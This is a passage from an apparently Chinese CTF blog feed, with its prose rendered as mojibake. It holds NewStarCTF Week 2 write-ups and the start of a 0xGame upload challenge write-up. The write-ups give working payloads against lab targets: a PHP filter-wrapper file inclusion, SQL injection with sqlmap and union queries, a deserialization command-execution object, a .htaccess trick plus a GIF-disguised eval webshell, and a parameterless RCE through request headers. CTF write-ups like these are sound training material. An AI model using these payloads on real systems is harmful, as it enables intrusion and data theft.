&#125;</span><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸‹è¿è¡Œè¿‡ç¨‹ï¼š</p><p>é¦–å…ˆæ˜¯<code>o1[a]=02[a]=1</code>ï¼Œç„¶åè¿›è¡Œ<code>o1.__proto__</code>å’Œ<code>o2.__proto__</code>(æ³¨æ„è¿™æ˜¯å…±æœ‰çš„ï¼Œæ‰€ä»¥è¿›è¡Œå¾ªç¯<code>merge</code>è¿‡ç¨‹)ï¼Œå³<code>o1.__proto__.b=o2.__proto__.b=2</code>ï¼Œå³<code>Object.prototype.b=2</code>ã€‚</p><p>ä¹Ÿå°±æ˜¯æœ€é¡¶å±‚çš„<code>Object.prototype</code>æ‰€æŒ‡å‘çš„å¯¹è±¡æ·»åŠ äº†å±æ€§,æ‰€ä»¥æˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¹Ÿå°±æœ‰äº†bè¿™ä¸ªå±æ€§(é—´æ¥æ‹¥æœ‰ï¼Œä¼šå‘ä¸ŠæŸ¥ä¸€ä¸ª<code>.proto__</code>)ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>jlkl.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">11</span><span class="hljs-regexp">/06/</span>Web_16/<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51586883/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119867720</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7182</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week2</title>
    <link href="/2023/10/12/NewStarCTF_Week2/"/>
    <url>/2023/10/12/NewStarCTF_Week2/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬äºŒå‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p>å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ</p><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªå°æ¸¸æˆï¼Œåˆ†æ•°åˆ°è¾¾<code>100000</code>æ‰èƒ½æ‹¿<code>flag</code>:</p><p><img src="/img/youxi1.png" alt="youxi1"></p><p>ç›®æµ‹æ˜¯è¦é€šè¿‡<code>burpsuite</code>ä¼ªé€ åˆ†æ•°æ•°æ®åŒ…ï¼Œå³é”®æºç æ²¡å•¥ä¸œè¥¿ï¼Œ<code>F12</code>æ‰“å¼€è°ƒè¯•å™¨ï¼Œå‘ç°<code>app_v2.js</code>ï¼š</p><p>åœ¨æ¸¸æˆè¿›è¡Œçš„è¿‡ç¨‹ä¸­å¹¶ä¸å­˜åœ¨æ•°æ®åŒ…ä¼ é€’ï¼Œé™¤éæ¸¸æˆç»“æŸæ—¶åˆ†æ•°<code>&gt;100000</code>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//æ¸¸æˆç»“æŸ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <span class="hljs-comment">//åˆ›å»ºXMLHttpRequestçš„å¯¹è±¡xhrï¼Œä¸æœåŠ¡å™¨é€šä¿¡</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//æŒ‡å®šäº¤äº’æ–¹å¼POSTï¼Œå¹¶å‘é€åˆ°api.php</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<span class="hljs-comment">//è®¾ç½®è¯·æ±‚å¤´ï¼ŒJSONæ ¼å¼</span><br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-comment">//ä¸‹é¢è¿™éƒ¨åˆ†å‡½æ•°ç”¨æ¥è¿”å›flag</span><br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥ä¼ªé€ ä¸€ä¸ªåŒ…å¥½äº†ï¼š<code>POST</code>æ–¹æ³•<code>api.php</code>ï¼Œ<code>host</code>å°±æ˜¯é¶æœºåœ°å€ï¼Œ<code>Content-Type:application/json</code>ï¼Œæ³¨æ„POSTçš„æ•°æ®è¦æ˜¯JSONæ ¼å¼è€Œä¸”ç©ºä¸€è¡Œï¼Œå…¶å®ƒä»»æ„:</p><p><img src="/img/youxi2.png" alt="youxi2"></p><p>å¦‚æœæ•°æ®åŒ…æ ¼å¼æœ‰é—®é¢˜å®ƒä¼šæç¤º<code>&#123;&quot;message&quot;:&quot;so low score&quot;&#125;</code></p><p>çœ‹äº†å®˜æ–¹<code>wp</code>å‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šç›´æ¥æ‰“å¼€æ§åˆ¶å°ä¼ <code>gameScore=9999999999</code>ï¼Œç„¶åç­‰æ¸¸æˆç»“æŸï¼š</p><p><img src="/img/youxi3.png" alt="youxi3"></p><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><p>åŒ…å«ä¹Ÿæœ‰å±å®³ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br><br></code></pre></td></tr></table></figure><p>ç›®æµ‹è¦ç”¨ä¼ªåè®®è¯»<code>flag.php</code>çš„æºç ï¼Œæ²¡è¿‡æ»¤<code>filter</code>ä½†è¿‡æ»¤äº†<code>base|rot/</code>è€Œä¸”æ˜¯<code>/i</code>æ¨¡å¼ï¼Œä¸è¿‡æ²¡å•¥å½±å“é™¤äº†<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>è¿˜æœ‰å¾ˆå¤šå…¶å®ƒæ–¹æ³•ã€‚</p><p>ä¹‹å‰æ”»é˜²ä¸–ç•Œæ­£å¥½åšè¿‡ä¸€ä¸ªç±»ä¼¼çš„ï¼Œpayload:</p><p><code>?file=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></p><p>æºç æ˜¯è¿™ä¸ªä¸œè¥¿ï¼š</p><p><code>&lt;?php //flag&#123;af954c6a-1ac4-4e23-a235-fc4108a03783&#125;</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>è™½ç„¶ä½¿ç”¨<code>sqlmap</code>æ˜¯æ²¡æœ‰çµé­‚çš„ï¼Œä½†æˆ‘è¿˜æ˜¯ç”¨äº†~</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 --current-db<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf --tables<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag --<span class="hljs-built_in">columns</span><br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag -C flag --dump<br></code></pre></td></tr></table></figure><p><code>flag:flag&#123;76715552-3304-4be1-b5e7-235d60421e41&#125;</code></p><p>åé¢çœ‹äº†ä¸‹wpï¼Œå› ä¸ºå¤ªä¹…æ²¡åšè¿™ç§æ‰‹æ³¨äº†ä¹Ÿè¯•äº†è¯•ï¼š</p><p>å…ˆåˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼š</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">--+</span>    æ­£å¸¸å›æ˜¾ï¼Œåˆæ­¥çŒœæµ‹å­—ç¬¦å‹æ³¨å…¥<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; And <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">--+</span>   æ­£å¸¸å›æ˜¾ï¼Œå­—ç¬¦å‹æ³¨å…¥  <span class="hljs-comment">// and è¢«è¿‡æ»¤äº†ï¼Œè¯•äº†è¯•ANDç»“æœå‘ç°æˆåŠŸç»•è¿‡</span><br>å¦‚æœæƒ³åœ¨URLä¸­ç”¨#è¿™ä¸ªæ³¨é‡Šç¬¦è¦ç¼–ç æˆ<span class="hljs-operator">%</span><span class="hljs-number">23</span>,å¤ªä¹…æ²¡åšSQLæ³¨å…¥äº†ï¼Œä¸€å¼€å§‹æŠŠè¿™èŒ¬å¿˜äº†ã€‚<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; oRdeR by <span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   åˆ¤æ–­å‡ åˆ—<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=-</span><span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   åˆ¤æ–­å›æ˜¾ä½ï¼Œè¿™äº”ä¸ªæ•°å­—åŒæ—¶å›æ˜¾<br>åé¢å°±æ˜¯æ­£å¸¸æ‰‹æ³¨è¿‡ç¨‹ã€‚<br>ä¸€å¼€å§‹ä»¥ä¸ºç›´æ¥ç”¨preg_matchçš„ <span class="hljs-operator">/</span>iæ¨¡å¼æŠŠå¤§å°å†™éƒ½æ­£åˆ™åŒ¹é…æ‰äº†ï¼Œåé¢å‘ç°å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ã€‚æœ¬æ¥è¿˜æƒ³å°è¯•ASCIIç¼–ç ç»•è¿‡ï¼Œå¼„äº†å¾ˆä¹…éƒ½æ²¡æˆåŠŸï¼Œæ‰¾äº†ä¸‹å‘ç°è¿™ç§æ–¹å¼åœ¨æŸäº›ç‰ˆæœ¬çš„mysqlä¸­ä¸èƒ½ç”¨äº†ã€‚ã€‚<br>https<span class="hljs-operator">:</span><span class="hljs-comment">//xz.aliyun.com/t/10594#toc-6</span><br></code></pre></td></tr></table></figure><h2 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-comment">// privateå±æ€§ï¼Œåºåˆ—åŒ–åä¼šåœ¨å±æ€§å‰ååˆ†åˆ«åŠ ç©º(\00,è½¬æˆURL%00)ï¼Œæ„å»ºpayloadè¦ç”¨rawurlencode</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">__destruct</span>é­”æœ¯æ–¹æ³•ï¼Œååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//ç®€å•çš„è¿‡æ»¤ï¼Œæƒ³è¯»æ–‡ä»¶çš„åŒ–å¯ä»¥ç”¨c&#x27;&#x27;atï¼Œca$&#123;Z&#125;tç­‰ç»•è¿‡</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//çœ‹çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//å½“å‰æ–‡ä»¶å¤¹ä¸‹ç»“æœï¼šindex.php</span><br></code></pre></td></tr></table></figure><p><img src="/img/unser1.png" alt="unser1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>; <span class="hljs-comment">//çœ‹äº†wpå‘ç°ç›´æ¥ç”¨headè¯»ä¹Ÿè¡Œ</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;aa2dff68-42ce-46b0-a7d7-bb1d8a524896&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/img/upload2.png" alt="upload2"></p><p>è‚¯å®šæ¯”week1è¿‡æ»¤æ›´ä¸¥æ ¼äº†ï¼Œä¸Šä¼ htaccess.å‘ç°ä¸Šä¼ æˆåŠŸï¼Œå†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test1.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>å†ä¸Šä¼ <code>test1.png</code>ï¼Œé…ç½®æ–‡ä»¶çš„å­˜åœ¨å¯ä»¥æŠŠ<code>test1.png</code>å½“æˆ<code>php</code>æ–‡ä»¶ï¼Œä»¥æ„é€ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;viper&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;notbad&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ è·¯å¾„ç›´æ¥å›æ˜¾å°±ä¸ç”¨<code>F12</code>å»æ‰¾äº†ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹çœ‹æ˜¯å¦è®¿é—®æˆåŠŸï¼Œç„¶åç›´æ¥ç”¨èšå‰‘è¿å°±èƒ½æ‹¿<code>flag</code>ï¼š</p><p><code>flag&#123;99c580dd-c75e-41f2-89da-4741ab19f655&#125;</code></p><p>åé¢çœ‹wpçŸ¥é“å®ƒæ˜¯æ£€æŸ¥äº†æ–‡ä»¶å†…å®¹ï¼š<code>&lt;?</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç›´æ¥ç”¨<code>dirsearch</code>æ‰«ï¼š</p><p><code>dirsearch -u http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/RCE1.png" alt="RCE1"></p><p><code>.git</code>æ³„éœ²ï¼Œåˆ‡æ¢æˆæ ¹ç”¨æˆ·<code>python2 GitHack.py http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/.git</code></p><p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>index.php</code>ä¸€ä¸ª<code>bo0g1pop.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸ª<code>((?R)?\)</code>ï¼Œå…¸å‹æ— å‚æ•°RCEã€‚</p><p>æ— å‚æ•°RCEç”¨çš„æ¯”è¾ƒå¤šçš„æ–¹æ³•æœ‰<code>getallheaders()</code>ï¼Œ<code>get_defined_var()</code>,<code>session_id</code>ã€‚è¿™é¢˜è¿‡æ»¤äº†<code>get_defined_vars</code>ï¼Œæ‰€ä»¥å°è¯•ç”¨å¦å¤–ä¸¤ç§ã€‚</p><p>å…ˆ<code>print_r(getallheaders())</code>çœ‹çœ‹ä»¥æ•°ç»„å½¢å¼è¿”å›çš„åŒ…å¤´æ˜¯ä»€ä¹ˆé¡ºåºçš„ï¼Œæ­£åºè¿˜æ˜¯å€’å™ï¼Ÿéƒ½è¿”å›å“ªäº›ï¼Ÿ</p><p><code>/bo0g1pop.php/?star=print_r(getallheaders());</code></p><p><img src="/img/rce22.png" alt="rce22"></p><p>æ­£åºå›æ˜¾ä»¥ä¸Šå†…å®¹ï¼Œæ„å»º<code>payload</code>:</p><p><code>?star=eavl(next(getallheaders()));</code> å¹¶æŠŠUser-Agentå¤´æ”¹æˆ<code>system(&#39;ls&#39;);</code></p><p><img src="/img/rce4.png" alt="rce4"></p><p><img src="/img/rce3.png" alt="rce3"></p><p>åé¢å‘½ä»¤æ”¹æˆ<code>cat /flag</code>å³å¯</p><p>è™½ç„¶Hostå¤´ç¬¬ä¸€ä½å°±å›æ˜¾äº†ï¼Œä½†ä¸èƒ½é€šè¿‡æ”¹Hostå¤´å»æ‰§è¡Œå‘½ä»¤ï¼Œå¦åˆ™ä¼šå¼¹400ã€‚æˆ–è€…åˆ©ç”¨<code>array_reverse</code>æ”¹æœ€åå›æ˜¾é‚£ä¸ª<code>X-Forwarded-Proto</code>å¤´ä¹Ÿè¡Œ</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week2</title>
    <link href="/2023/10/01/%5BWeek%202%5D%20ez_upload/"/>
    <url>/2023/10/01/%5BWeek%202%5D%20ez_upload/</url>
    
    <content type="html"><![CDATA[<p>0xGameç¬¬äºŒå‘¨ï¼Œåœ¨å¸ˆå‚…å·²ç»ç»™äº†å¤§é‡æç¤ºçš„æƒ…å†µä¸‹åªåšå‡ºä¸¤ä¸ªé¢˜:(</p><span id="more"></span><hr><h3 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h3><p>æ ¹æ®é¢˜ç›®çŒœæµ‹ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆæ‰“å¼€é¢˜ç›®çš„é™„ä»¶çœ‹çœ‹æœ‰å•¥ä¸œè¥¿ï¼Œå‘ç°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶åˆ©ç”¨<code>imagecreatefromç‚¹ç‚¹ç‚¹()</code>å’Œ<code>imageç‚¹ç‚¹ç‚¹()</code>è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼Œä¸»è¦éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//è·å¾—æ–‡ä»¶ç±»å‹ï¼Œcontent-typeï¼Œä¸Šä¼ ä¸€å¥è¯ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯ç»•ç‹—</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åˆšåˆšä¸Šä¼ çš„GIFï¼Œç»™source</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ 